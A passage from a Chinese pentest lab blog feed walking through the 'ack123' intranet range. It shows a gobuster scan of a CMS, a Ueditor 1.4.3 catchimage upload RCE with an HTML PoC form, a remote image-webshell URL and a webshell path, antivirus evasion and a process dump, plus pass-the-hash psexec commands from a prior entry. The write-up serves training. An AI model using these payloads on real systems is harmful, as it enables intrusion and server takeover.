<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">proxychains4 python psexec.py -hashes XXXXXXXXXXXXXXXXXXXXXX:XXXXXXXXXXXXXXXXXXXXXXX nasa.gov/administrator@10.10.10.140</span><br><span class="line"></span><br><span class="line">proxychains4 python psexec.py -hashes XXXXXXXXXXXXXXXXXXXXXX:XXXXXXXXXXXXXXXXXXXXXXX nasa.gov/administrator@10.10.10.141</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>内网靶场</category>
        <category>moonsec</category>
      </categories>
      <tags>
        <tag>内网渗透测试</tag>
        <tag>单兵能力</tag>
      </tags>
  </entry>
  <entry>
    <title>ack123</title>
    <url>/2022/03/13/blog_formal/security/%E9%9D%B6%E5%9C%BA/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/finish/ack123/</url>
    <content><![CDATA[<h1 id="ack123"><a href="#ack123" class="headerlink" title="ack123"></a>ack123</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    一个内网的综合靶场练习，提升个人单兵能力</p>
<a id="more"></a>

<h2 id="基础环境"><a href="#基础环境" class="headerlink" title="基础环境"></a>基础环境</h2><ul>
<li><p>kali2020</p>
</li>
<li><p>windows10</p>
</li>
<li><p>ack123</p>
</li>
</ul>
<p>备注：其中ack123基础环境拓扑图如下:</p>
<p><img data-src="./ack123/1.png" alt></p>
<p>配置host如下</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">192.168.59.136 www.ackmoon.com</span><br></pre></td></tr></table></figure>




<h2 id="测试步骤"><a href="#测试步骤" class="headerlink" title="测试步骤"></a>测试步骤</h2><h3 id="暴露公网web服务"><a href="#暴露公网web服务" class="headerlink" title="暴露公网web服务"></a>暴露公网web服务</h3><h4 id="web信息"><a href="#web信息" class="headerlink" title="web信息"></a>web信息</h4><ul>
<li>首页如下，可以发现其<code>cms</code>为<code>HDHCMS</code></li>
</ul>
<p><img data-src="./ack123/2.png" alt></p>
<ul>
<li>目录扫描</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://www.ackmoon.com/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,asp</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">C:\root&gt; gobuster dir -u http://www.ackmoon.com/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,asp</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.1.0</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://www.ackmoon.com/</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.1.0</span><br><span class="line">[+] Extensions:              html,txt,asp</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">2022/03/12 22:04:37 Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/images               (Status: 301) [Size: 153] [--&gt; http://www.ackmoon.com/images/]</span><br><span class="line">/Images               (Status: 301) [Size: 153] [--&gt; http://www.ackmoon.com/Images/]</span><br><span class="line">/admin                (Status: 301) [Size: 152] [--&gt; http://www.ackmoon.com/admin/] </span><br><span class="line">/member               (Status: 301) [Size: 153] [--&gt; http://www.ackmoon.com/member/]</span><br><span class="line">/m                    (Status: 301) [Size: 148] [--&gt; http://www.ackmoon.com/m/]     </span><br><span class="line">/template             (Status: 301) [Size: 155] [--&gt; http://www.ackmoon.com/template/]</span><br><span class="line">/database             (Status: 301) [Size: 155] [--&gt; http://www.ackmoon.com/database/]</span><br><span class="line">/js                   (Status: 301) [Size: 149] [--&gt; http://www.ackmoon.com/js/]      </span><br><span class="line">/api                  (Status: 301) [Size: 150] [--&gt; http://www.ackmoon.com/api/]     </span><br><span class="line">/M                    (Status: 301) [Size: 148] [--&gt; http://www.ackmoon.com/M/]       </span><br><span class="line">/IMAGES               (Status: 301) [Size: 153] [--&gt; http://www.ackmoon.com/IMAGES/]  </span><br><span class="line">/ok                   (Status: 301) [Size: 149] [--&gt; http://www.ackmoon.com/ok/]      </span><br><span class="line">/Database             (Status: 301) [Size: 155] [--&gt; http://www.ackmoon.com/Database/]</span><br><span class="line">/Admin                (Status: 301) [Size: 152] [--&gt; http://www.ackmoon.com/Admin/]   </span><br><span class="line">/Template             (Status: 301) [Size: 155] [--&gt; http://www.ackmoon.com/Template/]</span><br><span class="line">/*checkout*           (Status: 400) [Size: 3644]                                      </span><br><span class="line">/JS                   (Status: 301) [Size: 149] [--&gt; http://www.ackmoon.com/JS/]      </span><br><span class="line">/API                  (Status: 301) [Size: 150] [--&gt; http://www.ackmoon.com/API/]     </span><br><span class="line">/Member               (Status: 301) [Size: 153] [--&gt; http://www.ackmoon.com/Member/]  </span><br><span class="line">/*docroot*            (Status: 400) [Size: 3644]                                      </span><br><span class="line">/*                    (Status: 400) [Size: 3644]                                      </span><br><span class="line">/webservice           (Status: 301) [Size: 157] [--&gt; http://www.ackmoon.com/webservice/]</span><br><span class="line"><span class="meta">/http%</span><span class="bash">3A%2F%2Fwww     (Status: 400) [Size: 3644]                                        </span></span><br><span class="line">/OK                   (Status: 301) [Size: 149] [--&gt; http://www.ackmoon.com/OK/]        </span><br><span class="line"><span class="meta">/http%</span><span class="bash">3A              (Status: 400) [Size: 3644]                                        </span></span><br><span class="line"><span class="meta">/q%</span><span class="bash">26a                (Status: 400) [Size: 3664]                                        </span></span><br><span class="line">/**http%3a            (Status: 400) [Size: 3644]                                        </span><br><span class="line">/*http%3A             (Status: 400) [Size: 3644]                                        </span><br><span class="line">/**http%3A            (Status: 400) [Size: 3644]                                        </span><br><span class="line"><span class="meta">/http%</span><span class="bash">3A%2F%2Fyoutube (Status: 400) [Size: 3644]                                        </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">C0.txt              (Status: 400) [Size: 3644]                                        </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">C0.asp              (Status: 400) [Size: 3644]                                        </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">C0                  (Status: 400) [Size: 324]                                         </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">C0.html             (Status: 400) [Size: 3644]                                        </span></span><br><span class="line"><span class="meta">/http%</span><span class="bash">3A%2F%2Fblogs   (Status: 400) [Size: 3644]                                        </span></span><br><span class="line"><span class="meta">/http%</span><span class="bash">3A%2F%2Fblog    (Status: 400) [Size: 3644]                                        </span></span><br><span class="line">/**http%3A%2F%2Fwww   (Status: 400) [Size: 3644]                                        </span><br><span class="line"><span class="meta">/s%</span><span class="bash">26p                (Status: 400) [Size: 3664]                                        </span></span><br><span class="line">/WebService           (Status: 301) [Size: 157] [--&gt; http://www.ackmoon.com/WebService/]</span><br><span class="line"><span class="meta">/%</span><span class="bash">3FRID%3D2671        (Status: 400) [Size: 3644]                                        </span></span><br><span class="line">/devinmoore*          (Status: 400) [Size: 3644]                                        </span><br><span class="line">/200109*              (Status: 400) [Size: 3644]                                        </span><br><span class="line">/*sa_                 (Status: 400) [Size: 3644]                                        </span><br><span class="line">/*dc_                 (Status: 400) [Size: 3644]                                        </span><br><span class="line"><span class="meta">/http%</span><span class="bash">3A%2F%2Fcommunity (Status: 400) [Size: 3644]                                      </span></span><br><span class="line"><span class="meta">/Chamillionaire%</span><span class="bash">20%26%20Paul%20Wall-%20Get%20Ya%20Mind%20Correct (Status: 400) [Size: 3664]</span></span><br><span class="line"><span class="meta">/Clinton%</span><span class="bash">20Sparks%20%26%20Diddy%20-%20Dont%20Call%20It%20A%20Comeback%28RuZtY%29 (Status: 400) [Size: 3664]</span></span><br><span class="line"><span class="meta">/DJ%</span><span class="bash">20Haze%20%26%20The%20Game%20-%20New%20Blood%20Series%20Pt (Status: 400) [Size: 3664]                   </span></span><br><span class="line"><span class="meta">/http%</span><span class="bash">3A%2F%2Fradar   (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">D8                  (Status: 400) [Size: 324]                                                            </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">CE                  (Status: 400) [Size: 324]                                                            </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">CD                  (Status: 400) [Size: 324]                                                            </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">CC                  (Status: 400) [Size: 324]                                                            </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">CB                  (Status: 400) [Size: 324]                                                            </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">D8.html             (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">CF.html             (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">CE.html             (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">CD.html             (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">CA                  (Status: 400) [Size: 324]                                                            </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">CB.html             (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">CF.txt              (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">CC.html             (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">D8.txt              (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">CA.html             (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">CD.txt              (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">CE.txt              (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">D1                  (Status: 400) [Size: 324]                                                            </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">D0.html             (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">CC.txt              (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">CB.txt              (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">CF.asp              (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">D8.asp              (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">CE.asp              (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">CA.txt              (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">CF                  (Status: 400) [Size: 324]                                                            </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">CD.asp              (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">D5                  (Status: 400) [Size: 324]                                                            </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">D6                  (Status: 400) [Size: 324]                                                            </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">D1.html             (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">D0.txt              (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">D7.html             (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">CC.asp              (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">CB.asp              (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">CA.asp              (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">D6.html             (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">D4.txt              (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">D5.html             (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">D2                  (Status: 400) [Size: 324]                                                            </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">D1.txt              (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">D0.asp              (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">D0                  (Status: 400) [Size: 324]                                                            </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">D7.txt              (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">D3.asp              (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">D4.asp              (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">D6.txt              (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">C9                  (Status: 400) [Size: 324]                                                            </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">D3                  (Status: 400) [Size: 324]                                                            </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">D5.txt              (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">D4                  (Status: 400) [Size: 324]                                                            </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">D2.html             (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">D1.asp              (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">C8                  (Status: 400) [Size: 324]                                                            </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">C9.html             (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">D6.asp              (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">D7.asp              (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">D3.html             (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">D5.asp              (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">D4.html             (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">D2.txt              (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">C1.txt              (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">D7                  (Status: 400) [Size: 324]                                                            </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">C8.html             (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">C9.txt              (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">D3.txt              (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">D2.asp              (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">C1.asp              (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">C1                  (Status: 400) [Size: 324]                                                            </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">C8.txt              (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">C9.asp              (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">C1.html             (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">C8.asp              (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">C6                  (Status: 400) [Size: 324]                                                            </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">C2.asp              (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">C2                  (Status: 400) [Size: 324]                                                            </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">C7.asp              (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">C7                  (Status: 400) [Size: 324]                                                            </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">C3                  (Status: 400) [Size: 324]                                                            </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">C6.html             (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">C5.txt              (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">C4.asp              (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">C4                  (Status: 400) [Size: 324]                                                            </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">C2.html             (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">C7.html             (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">D9                  (Status: 400) [Size: 324]                                                            </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">C3.txt              (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">C6.txt              (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">C5.asp              (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">C5                  (Status: 400) [Size: 324]                                                            </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">C2.txt              (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">C4.html             (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">C7.txt              (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">D9.html             (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">C3.asp              (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">C6.asp              (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">C5.html             (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">C4.txt              (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">D9.txt              (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">C3.html             (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">D9.asp              (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">DF                  (Status: 400) [Size: 324]                                                            </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">DD                  (Status: 400) [Size: 324]                                                            </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">DF.html             (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">DE.txt              (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">DD.html             (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">DF.txt              (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">DE.asp              (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">DD.txt              (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">DF.asp              (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">DE.html             (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">DE                  (Status: 400) [Size: 324]                                                            </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">DD.asp              (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">DB.html             (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">DB.txt              (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">DB.asp              (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/%</span><span class="bash">DB                  (Status: 400) [Size: 324]                                                            </span></span><br><span class="line"><span class="meta">/q%</span><span class="bash">26a2               (Status: 400) [Size: 3664]                                                           </span></span><br><span class="line"><span class="meta">/login%</span><span class="bash">3f             (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/Shakira%</span><span class="bash">20Oral%20Fixation%201%20%26%202 (Status: 400) [Size: 3664]                                        </span></span><br><span class="line">/DATABASE             (Status: 301) [Size: 155] [--&gt; http://www.ackmoon.com/DATABASE/]                     </span><br><span class="line">/TEMPLATE             (Status: 301) [Size: 155] [--&gt; http://www.ackmoon.com/TEMPLATE/]                     </span><br><span class="line"><span class="meta">/http%</span><span class="bash">3A%2F%2Fjeremiahgrossman (Status: 400) [Size: 3644]                                                  </span></span><br><span class="line"><span class="meta">/http%</span><span class="bash">3A%2F%2Fweblog  (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line"><span class="meta">/http%</span><span class="bash">3A%2F%2Fswik    (Status: 400) [Size: 3644]                                                           </span></span><br><span class="line">                                                                                                           </span><br><span class="line">===============================================================</span><br><span class="line">2022/03/12 22:09:32 Finished</span><br><span class="line">===============================================================</span><br></pre></td></tr></table></figure>

<ul>
<li>发现后台地址</li>
</ul>
<p><img data-src="./ack123/3.png" alt></p>
<ul>
<li>这里注册一个账号为 <code>laotie233 / 123456</code></li>
</ul>
<p><img data-src="./ack123/4.png" alt></p>
<h4 id="后台rce"><a href="#后台rce" class="headerlink" title="后台rce"></a>后台rce</h4><ul>
<li>登录后台，发现如下插件 <code>Ueditor 1.4.3</code></li>
</ul>
<p><img data-src="./ack123/5.png" alt></p>
<ul>
<li>路径通过下载源码审计可以得到</li>
</ul>
<p><img data-src="./ack123/6.png" alt></p>
<ul>
<li>访问如下链接: <a href="http://xxxxxxxxx/ueditor/net/controller.ashx?action=catchimage" target="_blank" rel="noopener">http://xxxxxxxxx/ueditor/net/controller.ashx?action=catchimage</a>  <a href="http://www.ackmoon.com/admin/net/controller.ashx?action=catchimage" target="_blank" rel="noopener">http://www.ackmoon.com/admin/net/controller.ashx?action=catchimage</a></li>
</ul>
<p><img data-src="./ack123/7.png" alt></p>
<ul>
<li><p>存在文件上传rce问题(备注: 这里一直有问题，靶场环境失败，直接给作弊给shell，不纠结)</p>
</li>
<li><p>构造poc</p>
</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://www.ackmoon.com/admin/net/controller.ashx?action=catchimage"</span> <span class="attr">enctype</span>=<span class="string">"application/x-www-form-urlencoded"</span>  <span class="attr">method</span>=<span class="string">"POST"</span>&gt;</span>   <span class="tag">&lt;<span class="name">p</span>&gt;</span>shell addr: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"source[]"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">p</span> &gt;</span>  <span class="tag">&lt;<span class="name">inputtype="submit"</span> <span class="attr">value</span>=<span class="string">"Submit"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>构造asp图片马(文件名改为2.jpg)，并使用恶意html进行上传</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http://192.168.59.138/2.jpg?.aspx</span><br></pre></td></tr></table></figure>

<p><img data-src="./ack123/8.png" alt></p>
<p><img data-src="./ack123/9.png" alt></p>
<ul>
<li>拿到后门地址为 <code>upfiles/image/20220313/6378278920347583187225706.aspx</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http://www.ackmoon.com/upfiles/image/20220313/6378278920347583187225706.aspx</span><br></pre></td></tr></table></figure>

<p><img data-src="./ack123/10.png" alt></p>
<ul>
<li>这里有有360杀毒，蚁剑<code>shell</code>会被干掉</li>
</ul>
<p><img data-src="./ack123/11.png" alt></p>
<ul>
<li>换一个aspx大马，可以运行指令</li>
</ul>
<p><img data-src="./ack123/12.png" alt></p>
<ul>
<li>发现为普通用户</li>
<li>查看系统杀软信息</li>
</ul>
<p><img data-src="./ack123/13.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">映像名称                       PID 服务                                        </span><br><span class="line">========================= ======== ============================================</span><br><span class="line">System Idle Process              0 暂缺                                        </span><br><span class="line">System                           4 暂缺                                        </span><br><span class="line">smss.exe                       252 暂缺                                        </span><br><span class="line">csrss.exe                      352 暂缺                                        </span><br><span class="line">wininit.exe                    432 暂缺                                        </span><br><span class="line">csrss.exe                      440 暂缺                                        </span><br><span class="line">winlogon.exe                   468 暂缺                                        </span><br><span class="line">services.exe                   528 暂缺                                        </span><br><span class="line">lsass.exe                      536 SamSs, VaultSvc                             </span><br><span class="line">svchost.exe                    592 BrokerInfrastructure, DcomLaunch, LSM,      </span><br><span class="line">                                   PlugPlay, Power, SystemEventsBroker         </span><br><span class="line">svchost.exe                    620 RpcEptMapper, RpcSs                         </span><br><span class="line">dwm.exe                        712 暂缺                                        </span><br><span class="line">svchost.exe                    720 Dhcp, EventLog, lmhosts, Wcmsvc             </span><br><span class="line">svchost.exe                    796 BITS, gpsvc, IKEEXT, iphlpsvc,              </span><br><span class="line">                                   LanmanServer, ProfSvc, Schedule, seclogon,  </span><br><span class="line">                                   SENS, ShellHWDetection, Themes, Winmgmt     </span><br><span class="line">svchost.exe                    860 EventSystem, FontCache, netprofm, nsi,      </span><br><span class="line">                                   W32Time, WinHttpAutoProxySvc                </span><br><span class="line">360rps.exe                     928 360rp                                       </span><br><span class="line">svchost.exe                    996 CryptSvc, Dnscache, LanmanWorkstation,      </span><br><span class="line">                                   NlaSvc, WinRM                               </span><br><span class="line">svchost.exe                    344 BFE, DPS, MpsSvc                            </span><br><span class="line">spoolsv.exe                   1252 Spooler                                     </span><br><span class="line">svchost.exe                   1296 AppHostSvc                                  </span><br><span class="line">svchost.exe                   1316 DiagTrack                                   </span><br><span class="line">svchost.exe                   1352 ftpsvc                                      </span><br><span class="line">HwsHostSvc.exe                1392 HwsHostSvc                                  </span><br><span class="line">inetinfo.exe                  1412 IISADMIN                                    </span><br><span class="line">mysqld.exe                    1516 MySQL                                       </span><br><span class="line">Service_KMS.exe               1568 Service KMSELDI                             </span><br><span class="line">svchost.exe                   1616 Netman, TrkWks, UALSVC                      </span><br><span class="line">VGAuthService.exe             1652 VGAuthService                               </span><br><span class="line">vmtoolsd.exe                  1696 VMTools                                     </span><br><span class="line">svchost.exe                   1716 W3SVC, WAS                                  </span><br><span class="line">svchost.exe                   1964 PolicyAgent                                 </span><br><span class="line">WmiPrvSE.exe                  1784 暂缺                                        </span><br><span class="line">dllhost.exe                   2100 COMSysApp                                   </span><br><span class="line">msdtc.exe                     2308 MSDTC                                       </span><br><span class="line">WmiPrvSE.exe                  2488 暂缺                                        </span><br><span class="line">taskhostex.exe                2300 暂缺                                        </span><br><span class="line">explorer.exe                  1372 暂缺                                        </span><br><span class="line">360sd.exe                     2560 暂缺                                        </span><br><span class="line">ChsIME.exe                    3036 暂缺                                        </span><br><span class="line">dllhost.exe                   1704 暂缺                                        </span><br><span class="line">vm3dservice.exe                924 暂缺                                        </span><br><span class="line">vmtoolsd.exe                   156 暂缺                                        </span><br><span class="line">HwsHostPanel.exe              2240 暂缺                                        </span><br><span class="line">HwsHostMaster.exe             4784 暂缺                                        </span><br><span class="line">hws.exe                       4824 hws                                         </span><br><span class="line">WinSW.exe                     8596 frp                                         </span><br><span class="line">frpc.exe                      6876 暂缺                                        </span><br><span class="line">conhost.exe                   9140 暂缺                                        </span><br><span class="line">powershell.exe                9888 暂缺                                        </span><br><span class="line">conhost.exe                   6908 暂缺                                        </span><br><span class="line">multitip.exe                  8772 暂缺                                        </span><br><span class="line">360rp.exe                    13188 暂缺                                        </span><br><span class="line">w3wp.exe                     14204 暂缺                                        </span><br><span class="line">cmd.exe                       4420 暂缺                                        </span><br><span class="line">conhost.exe                   1368 暂缺                                        </span><br><span class="line">cmd.exe                      14528 暂缺                                        </span><br><span class="line">conhost.exe                  14920 暂缺                                        </span><br><span class="line">cmd.exe                      14512 暂缺                                        </span><br><span class="line">conhost.exe                  13004 暂缺                                        </span><br><span class="line">cmd.exe                      11288 暂缺                                        </span><br><span class="line">conhost.exe                  12244 暂缺                                        </span><br><span class="line">cmd.exe                      15096 暂缺                                        </span><br><span class="line">conhost.exe                  15036 暂缺                                        </span><br><span class="line">cmd.exe                      14772 暂缺                                        </span><br><span class="line">conhost.exe                  14568 暂缺                                        </span><br><span class="line">cmd.exe                      13528 暂缺                                        </span><br><span class="line">conhost.exe                  14368 暂缺                                        </span><br><span class="line">360Tray.exe                  15796 暂缺                                        </span><br><span class="line">ZhuDongFangYu.exe            15692 ZhuDongFangYu                               </span><br><span class="line">SoftMgrLite.exe               4988 暂缺                                        </span><br><span class="line">360speedld.exe                6616 暂缺                                        </span><br><span class="line">cmd.exe                      11872 暂缺                                        </span><br><span class="line">conhost.exe                   9948 